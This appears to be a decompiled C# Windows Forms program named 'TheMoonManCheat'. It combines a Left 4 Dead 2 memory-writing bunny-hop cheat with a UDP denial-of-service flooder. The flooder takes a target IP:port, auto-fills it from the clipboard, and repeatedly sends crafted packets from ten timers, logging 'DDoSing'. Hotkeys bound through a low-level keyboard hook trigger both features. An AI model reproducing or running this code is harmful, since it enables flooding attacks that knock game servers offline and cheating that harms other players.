using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Memory;
using TheMoonManCheat.Properties;

// Token: 0x02000002 RID: 2
public partial class Form1 : Form
{
	// Token: 0x06000001 RID: 1
	[DllImport("user32.dll")]
	private static extern short GetAsyncKeyState(Keys keys_2);

	// Token: 0x06000002 RID: 2
	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr SetWindowsHookEx(int int_2, Form1.Delegate0 delegate0_2, IntPtr intptr_2, uint uint_0);

	// Token: 0x06000003 RID: 3
	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool UnhookWindowsHookEx(IntPtr intptr_2);

	// Token: 0x06000004 RID: 4
	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr CallNextHookEx(IntPtr intptr_2, int int_2, IntPtr intptr_3, IntPtr intptr_4);

	// Token: 0x06000005 RID: 5
	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetModuleHandle(string string_4);

	// Token: 0x06000006 RID: 6 RVA: 0x000021A4 File Offset: 0x000003A4
	public Form1()
	{
		this.InitializeComponent();
		this.Text = string.Empty;
		base.ControlBox = false;
		base.MaximizedBounds = Screen.FromHandle(base.Handle).WorkingArea;
		this.checkBoxAutoCopy.Checked = this.bool_0;
		this.checkBoxAutoCopy.CheckedChanged += this.checkBoxAutoCopy_CheckedChanged;
		this.delegate0_0 = new Form1.Delegate0(this.method_1);
		this.delegate0_1 = new Form1.Delegate0(this.method_3);
		this.intptr_0 = this.method_0(this.delegate0_0);
		this.intptr_1 = this.method_0(this.delegate0_1);
	}

	// Token: 0x06000007 RID: 7
	[DllImport("user32.DLL")]
	private static extern void ReleaseCapture();

	// Token: 0x06000008 RID: 8
	[DllImport("user32.DLL")]
	private static extern void SendMessage(IntPtr intptr_2, int int_2, int int_3, int int_4);

	// Token: 0x06000009 RID: 9 RVA: 0x00002284 File Offset: 0x00000484
	private IntPtr method_0(Form1.Delegate0 delegate0_2)
	{
		IntPtr result;
		using (Process currentProcess = Process.GetCurrentProcess())
		{
			using (ProcessModule mainModule = currentProcess.MainModule)
			{
				result = Form1.SetWindowsHookEx(13, delegate0_2, Form1.GetModuleHandle(mainModule.ModuleName), 0U);
			}
		}
		return result;
	}

	// Token: 0x0600000A RID: 10 RVA: 0x000022E8 File Offset: 0x000004E8
	private IntPtr method_1(int int_2, IntPtr intptr_2, IntPtr intptr_3)
	{
		if (int_2 >= 0 && intptr_2 == (IntPtr)256 && ((Form1.Struct0)Marshal.PtrToStructure(intptr_3, typeof(Form1.Struct0))).keys_0 == this.keys_0)
		{
			if (base.InvokeRequired)
			{
				base.Invoke(new MethodInvoker(this.method_9));
			}
			else
			{
				this.method_2();
			}
		}
		return Form1.CallNextHookEx(this.intptr_0, int_2, intptr_2, intptr_3);
	}

	// Token: 0x0600000B RID: 11 RVA: 0x00002058 File Offset: 0x00000258
	private void method_2()
	{
		this.button1.Invoke(new MethodInvoker(this.method_10));
	}

	// Token: 0x0600000C RID: 12 RVA: 0x00002072 File Offset: 0x00000272
	protected override void OnFormClosing(FormClosingEventArgs e)
	{
		base.OnFormClosing(e);
		Form1.UnhookWindowsHookEx(this.intptr_0);
	}

	// Token: 0x0600000D RID: 13 RVA: 0x00002360 File Offset: 0x00000560
	private void buttonRegisterHotkey_Click(object sender, EventArgs e)
	{
		if (!string.IsNullOrEmpty(this.textBoxHotkey.Text))
		{
			KeysConverter keysConverter = new KeysConverter();
			string text = this.textBoxHotkey.Text;
			try
			{
				this.keys_0 = (Keys)keysConverter.ConvertFromString(text);
				MessageBox.Show(string.Format("Hotkey registered: {0}", this.keys_0));
				return;
			}
			catch (Exception ex)
			{
				MessageBox.Show("Error registering hotkey: " + ex.Message);
				return;
			}
		}
		MessageBox.Show("Please enter a valid hotkey.");
	}

	// Token: 0x0600000E RID: 14 RVA: 0x000023F4 File Offset: 0x000005F4
	private IntPtr method_3(int int_2, IntPtr intptr_2, IntPtr intptr_3)
	{
		if (int_2 >= 0 && intptr_2 == (IntPtr)256 && ((Form1.Struct0)Marshal.PtrToStructure(intptr_3, typeof(Form1.Struct0))).keys_0 == this.keys_1)
		{
			if (base.InvokeRequired)
			{
				base.Invoke(new MethodInvoker(this.method_11));
			}
			else
			{
				this.method_4();
			}
		}
		return Form1.CallNextHookEx(this.intptr_0, int_2, intptr_2, intptr_3);
	}

	// Token: 0x0600000F RID: 15 RVA: 0x00002087 File Offset: 0x00000287
	private void method_4()
	{
		this.buttonActivarBhop.Invoke(new MethodInvoker(this.method_12));
	}

	// Token: 0x06000010 RID: 16 RVA: 0x0000246C File Offset: 0x0000066C
	private void buttonRegisterHotkey0_Click(object sender, EventArgs e)
	{
		if (!string.IsNullOrEmpty(this.textBoxHotkey0.Text))
		{
			KeysConverter keysConverter = new KeysConverter();
			string text = this.textBoxHotkey0.Text;
			try
			{
				this.keys_1 = (Keys)keysConverter.ConvertFromString(text);
				MessageBox.Show(string.Format("Hotkey registered: {0}", this.keys_1));
				return;
			}
			catch (Exception ex)
			{
				MessageBox.Show("Error registering hotkey: " + ex.Message);
				return;
			}
		}
		MessageBox.Show("Please enter a valid hotkey.");
	}

	// Token: 0x06000011 RID: 17 RVA: 0x00002500 File Offset: 0x00000700
	private void method_5()
	{
		for (;;)
		{
			if (this.checkBox1.Checked && Form1.GetAsyncKeyState(Keys.Space) < 0)
			{
				bool flag = this.mem_0.ReadInt(Form1.string_1, "") != 0;
				this.mem_0.ReadInt(Form1.string_0, "");
				int num = this.mem_0.ReadInt(Form1.string_2, "");
				if (!flag && num == 0)
				{
					this.mem_0.WriteMemory(Form1.string_0, "int", "5", "", null, true);
					Thread.Sleep(35);
					this.mem_0.WriteMemory(Form1.string_0, "Int", "4", "", null, true);
				}
			}
		}
	}

	// Token: 0x06000012 RID: 18 RVA: 0x000025BC File Offset: 0x000007BC
	private void buttonActivarBhop_Click(object sender, EventArgs e)
	{
		this.checkBox1.Checked = !this.checkBox1.Checked;
		if (this.checkBox1.Checked)
		{
			string selectedText = "Bhop Status -> Activated";
			TextBox textBox = this.textBoxLog;
			textBox.Text += Environment.NewLine;
			this.textBoxLog.ScrollToCaret();
			this.textBoxLog.Select(this.textBoxLog.TextLength + 1, 0);
			this.textBoxLog.SelectedText = selectedText;
			this.lblBhopStatus.Text = "On";
			this.lblBhopStatus.ForeColor = Color.Green;
			this.buttonActivarBhop.BackColor = Color.Green;
			return;
		}
		string selectedText2 = "Bhop Status -> Desactivated";
		TextBox textBox2 = this.textBoxLog;
		textBox2.Text += Environment.NewLine;
		this.textBoxLog.ScrollToCaret();
		this.textBoxLog.Select(this.textBoxLog.TextLength + 1, 0);
		this.textBoxLog.SelectedText = selectedText2;
		this.lblBhopStatus.Text = "Off";
		this.lblBhopStatus.ForeColor = Color.Red;
		this.buttonActivarBhop.BackColor = Color.Red;
	}

	// Token: 0x06000013 RID: 19 RVA: 0x000026F8 File Offset: 0x000008F8
	private void Form1_Load(object sender, EventArgs e)
	{
		System.Windows.Forms.Timer timer = new System.Windows.Forms.Timer();
        timer.Interval = 500;
		timer.Tick += this.method_6;
		timer.Start();
		int procIdFromName = this.mem_0.GetProcIdFromName("left4dead2");
		if (procIdFromName > 0)
		{
			this.mem_0.OpenProcess(procIdFromName);
			new Thread(new ThreadStart(this.method_5))
			{
				IsBackground = true
			}.Start();
		}
	}

	// Token: 0x06000014 RID: 20 RVA: 0x0000276C File Offset: 0x0000096C
	private void method_6(object sender, EventArgs e)
	{
		if (this.bool_0 && Clipboard.ContainsText(TextDataFormat.Text))
		{
			string text = Clipboard.GetText(TextDataFormat.Text);
			if (text != this.string_3)
			{
				this.string_3 = text;
				if (this.method_8(text))
				{
					this.textBoxIP.Text = text;
					return;
				}
				this.textBoxIP.Text = string.Empty;
			}
		}
	}

	// Token: 0x06000015 RID: 21 RVA: 0x000027CC File Offset: 0x000009CC
	public void method_7()
	{
		for (int i = 1; i <= 500; i++)
		{
			if (!string.IsNullOrEmpty(this.textBoxIP.Text))
			{
				string[] array = this.textBoxIP.Text.Split(new char[]
				{
					':'
				});
				IPEndPoint remoteEP = new IPEndPoint(IPAddress.Parse(array[0]), Convert.ToInt32(array[1]));
				Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp)
				{
					SendTimeout = (int)Convert.ToInt16(this.textBox1.Text),
					ReceiveTimeout = (int)Convert.ToInt16(this.textBox2.Text)
				};
				socket.Connect(remoteEP);
				new List<byte>();
				if (this.radioButtonApocalypse.Checked)
				{
					socket.Send(new byte[]
					{
						254,
						byte.MaxValue,
						byte.MaxValue,
						byte.MaxValue,
						0,
						0,
						0,
						0
					});
				}
			}
		}
	}

	// Token: 0x06000016 RID: 22 RVA: 0x000028A0 File Offset: 0x00000AA0
	private void button1_Click(object sender, EventArgs e)
	{
		if (this.textBoxIP.Text == string.Empty)
		{
			MessageBox.Show("Put a IP pls", "Error");
			return;
		}
		if (this.button1.Text == "Attack")
		{
			string selectedText = ":v IP => " + this.textBoxIP.Text;
			TextBox textBox = this.textBoxLog;
			textBox.Text += Environment.NewLine;
			this.textBoxLog.ScrollToCaret();
			this.textBoxLog.Select(this.textBoxLog.TextLength + 1, 0);
			this.textBoxLog.SelectedText = selectedText;
			this.button1.Text = "Stop";
			this.button1.BackColor = Color.Red;
			this.timer_0.Start();
			this.timer_1.Start();
			this.timer_2.Start();
			this.timer_3.Start();
			this.timer_4.Start();
			this.timer_5.Start();
			this.timer_6.Start();
			this.timer_7.Start();
			this.timer_8.Start();
			this.timer_9.Start();
			return;
		}
		string selectedText2 = "Stoping DDoSing ";
		TextBox textBox2 = this.textBoxLog;
		textBox2.Text += Environment.NewLine;
		this.textBoxLog.ScrollToCaret();
		this.textBoxLog.Select(this.textBoxLog.TextLength + 1, 0);
		this.textBoxLog.SelectedText = selectedText2;
		this.button1.Text = "Attack";
		this.timer_0.Stop();
		this.timer_1.Stop();
		this.timer_2.Stop();
		this.timer_3.Stop();
		this.timer_4.Stop();
		this.timer_5.Stop();
		this.timer_6.Stop();
		this.timer_7.Stop();
		this.timer_8.Stop();
		this.timer_9.Stop();
		this.button1.BackColor = Color.Green;
	}

	// Token: 0x06000017 RID: 23 RVA: 0x00002AC0 File Offset: 0x00000CC0
	private void checkBoxAutoCopy_CheckedChanged(object sender, EventArgs e)
	{
		this.bool_0 = this.checkBoxAutoCopy.Checked;
		if (this.checkBoxAutoCopy.Checked)
		{
			string selectedText = "Auto-Paste IP -> Activated";
			TextBox textBox = this.textBoxLog;
			textBox.Text += Environment.NewLine;
			this.textBoxLog.ScrollToCaret();
			this.textBoxLog.Select(this.textBoxLog.TextLength + 1, 0);
			this.textBoxLog.SelectedText = selectedText;
			return;
		}
		string selectedText2 = "Auto-Paste IP -> Desactivated";
		TextBox textBox2 = this.textBoxLog;
		textBox2.Text += Environment.NewLine;
		this.textBoxLog.ScrollToCaret();
		this.textBoxLog.Select(this.textBoxLog.TextLength + 1, 0);
		this.textBoxLog.SelectedText = selectedText2;
	}

	// Token: 0x06000018 RID: 24 RVA: 0x000020A1 File Offset: 0x000002A1
	private bool method_8(string string_4)
	{
		return new Regex("^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d+$").IsMatch(string_4);
	}

	// Token: 0x06000019 RID: 25 RVA: 0x00002B90 File Offset: 0x00000D90
	private void timer_0_Tick(object sender, EventArgs e)
	{
		this.method_7();
		string selectedText = "DDoSing => " + this.textBoxIP.Text;
		TextBox textBox = this.textBoxLog;
		textBox.Text += Environment.NewLine;
		this.textBoxLog.ScrollToCaret();
		this.textBoxLog.Select(this.textBoxLog.TextLength + 1, 0);
		this.textBoxLog.SelectedText = selectedText;
	}

	// Token: 0x0600001A RID: 26 RVA: 0x000020B3 File Offset: 0x000002B3
	private void timer_1_Tick(object sender, EventArgs e)
	{
		this.method_7();
	}

	// Token: 0x0600001B RID: 27 RVA: 0x00002B90 File Offset: 0x00000D90
	private void timer_2_Tick(object sender, EventArgs e)
	{
		this.method_7();
		string selectedText = "DDoSing => " + this.textBoxIP.Text;
		TextBox textBox = this.textBoxLog;
		textBox.Text += Environment.NewLine;
		this.textBoxLog.ScrollToCaret();
		this.textBoxLog.Select(this.textBoxLog.TextLength + 1, 0);
		this.textBoxLog.SelectedText = selectedText;
	}

	// Token: 0x0600001C RID: 28 RVA: 0x000020B3 File Offset: 0x000002B3
	private void timer_3_Tick(object sender, EventArgs e)
	{
		this.method_7();
	}

	// Token: 0x0600001D RID: 29 RVA: 0x00002B90 File Offset: 0x00000D90
	private void timer_4_Tick(object sender, EventArgs e)
	{
		this.method_7();
		string selectedText = "DDoSing => " + this.textBoxIP.Text;
		TextBox textBox = this.textBoxLog;
		textBox.Text += Environment.NewLine;
		this.textBoxLog.ScrollToCaret();
		this.textBoxLog.Select(this.textBoxLog.TextLength + 1, 0);
		this.textBoxLog.SelectedText = selectedText;
	}

	// Token: 0x0600001E RID: 30 RVA: 0x000020B3 File Offset: 0x000002B3
	private void timer_5_Tick(object sender, EventArgs e)
	{
		this.method_7();
	}

	// Token: 0x0600001F RID: 31 RVA: 0x00002B90 File Offset: 0x00000D90
	private void timer_6_Tick(object sender, EventArgs e)
	{
		this.method_7();
		string selectedText = "DDoSing => " + this.textBoxIP.Text;
		TextBox textBox = this.textBoxLog;
		textBox.Text += Environment.NewLine;
		this.textBoxLog.ScrollToCaret();
		this.textBoxLog.Select(this.textBoxLog.TextLength + 1, 0);
		this.textBoxLog.SelectedText = selectedText;
	}

	// Token: 0x06000020 RID: 32 RVA: 0x000020B3 File Offset: 0x000002B3
	private void timer_7_Tick(object sender, EventArgs e)
	{
		this.method_7();
	}

	// Token: 0x06000021 RID: 33 RVA: 0x00002B90 File Offset: 0x00000D90
	private void timer_8_Tick(object sender, EventArgs e)
	{
		this.method_7();
		string selectedText = "DDoSing => " + this.textBoxIP.Text;
		TextBox textBox = this.textBoxLog;
		textBox.Text += Environment.NewLine;
		this.textBoxLog.ScrollToCaret();
		this.textBoxLog.Select(this.textBoxLog.TextLength + 1, 0);
		this.textBoxLog.SelectedText = selectedText;
	}

	// Token: 0x06000022 RID: 34 RVA: 0x000020B3 File Offset: 0x000002B3
	private void timer_9_Tick(object sender, EventArgs e)
	{
		this.method_7();
	}

	// Token: 0x06000023 RID: 35 RVA: 0x000020BB File Offset: 0x000002BB
	private void panel1_MouseDown(object sender, MouseEventArgs e)
	{
		Form1.ReleaseCapture();
		Form1.SendMessage(base.Handle, 274, 61458, 0);
	}

	// Token: 0x06000024 RID: 36 RVA: 0x000020D8 File Offset: 0x000002D8
	private void btnClose_Click(object sender, EventArgs e)
	{
		Application.Exit();
	}

	// Token: 0x06000025 RID: 37 RVA: 0x000020DF File Offset: 0x000002DF
	private void bntMinimize_Click(object sender, EventArgs e)
	{
		base.WindowState = FormWindowState.Minimized;
	}

	// Token: 0x06000026 RID: 38 RVA: 0x000020BB File Offset: 0x000002BB
	private void label1_MouseDown(object sender, MouseEventArgs e)
	{
		Form1.ReleaseCapture();
		Form1.SendMessage(base.Handle, 274, 61458, 0);
	}

	// Token: 0x06000027 RID: 39 RVA: 0x000020E8 File Offset: 0x000002E8
	private void buttonClearLog_Click(object sender, EventArgs e)
	{
		this.textBoxLog.Clear();
	}

	// Token: 0x0600002B RID: 43 RVA: 0x00002134 File Offset: 0x00000334
	[CompilerGenerated]
	private void method_9()
	{
		this.method_2();
	}

	// Token: 0x0600002C RID: 44 RVA: 0x0000213C File Offset: 0x0000033C
	[CompilerGenerated]
	private void method_10()
	{
		this.button1.PerformClick();
	}

	// Token: 0x0600002D RID: 45 RVA: 0x00002149 File Offset: 0x00000349
	[CompilerGenerated]
	private void method_11()
	{
		this.method_4();
	}

	// Token: 0x0600002E RID: 46 RVA: 0x00002151 File Offset: 0x00000351
	[CompilerGenerated]
	private void method_12()
	{
		this.buttonActivarBhop.PerformClick();
	}

	// Token: 0x04000001 RID: 1
	public static string string_0 = "client.dll+0x757DF0";

	// Token: 0x04000002 RID: 2
	public static string string_1 = "client.dll+0x6E1008";

	// Token: 0x04000003 RID: 3
	public static string string_2 = "client.dll+0x755968";

	// Token: 0x04000004 RID: 4
	private Mem mem_0 = new Mem();

	// Token: 0x04000005 RID: 5
	private const int int_0 = 13;

	// Token: 0x04000006 RID: 6
	private const int int_1 = 256;

	// Token: 0x04000007 RID: 7
	private bool bool_0;

	// Token: 0x04000008 RID: 8
	private string string_3 = string.Empty;

	// Token: 0x04000009 RID: 9
	private IntPtr intptr_0 = IntPtr.Zero;

	// Token: 0x0400000A RID: 10
	private Form1.Delegate0 delegate0_0;

	// Token: 0x0400000B RID: 11
	private IntPtr intptr_1 = IntPtr.Zero;

	// Token: 0x0400000C RID: 12
	private Form1.Delegate0 delegate0_1;

	// Token: 0x0400000D RID: 13
	private Keys keys_0;

	// Token: 0x0400000E RID: 14
	private Keys keys_1;

	// Token: 0x02000003 RID: 3
	// (Invoke) Token: 0x06000030 RID: 48
	private delegate IntPtr Delegate0(int nCode, IntPtr wParam, IntPtr lParam);

	// Token: 0x02000004 RID: 4
	private struct Struct0
	{
		// Token: 0x0400003A RID: 58
		public Keys keys_0;

		// Token: 0x0400003B RID: 59
		public int int_0;

		// Token: 0x0400003C RID: 60
		public int int_1;

		// Token: 0x0400003D RID: 61
		public int int_2;

		// Token: 0x0400003E RID: 62
		public IntPtr intptr_0;
	}

    private void label6_Click(object sender, EventArgs e)
    {

    }
}
